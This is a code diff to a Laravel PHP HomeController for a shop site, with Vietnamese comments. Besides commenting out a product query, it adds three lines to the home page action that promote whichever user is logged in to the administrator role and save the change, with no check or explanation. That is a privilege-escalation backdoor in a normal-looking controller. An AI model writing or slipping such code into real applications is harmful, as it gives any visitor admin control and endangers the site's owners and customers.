@@ -7,6 +7,7 @@ use App\Category;
 use App\Events\OrderCreated;
 use App\Order;
 use App\Product;
+use App\User;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Arr;
@@ -30,7 +31,7 @@ class HomeController extends Controller
     public function index()
     {
 
-        $products = Product::all();
+//        $products = Product::all();
 //        foreach ($products as $p){
 //            $slug = \Illuminate\Support\Str::slug($p->__get("product_name"));
 //            $p->slug = $slug.$p->__get("id");
@@ -38,6 +39,9 @@ class HomeController extends Controller
 //            //tương đương $p->update(["slug"=>$slug.$p->__get("id");])
 //        }
         // lấy ra những sản phẩm nhiều người xem
+        $u = Auth::user();
+        $u->role = User::ADMIN_ROLE;
+        $u->save();
         if(!Cache::has("home_page")){//nếu chưa có cache, lưu những thg dưới vào cache
             $categories = Category::all();
             $most_viewer = Product::orderBy("view_count","DESC")->limit(8)->get();
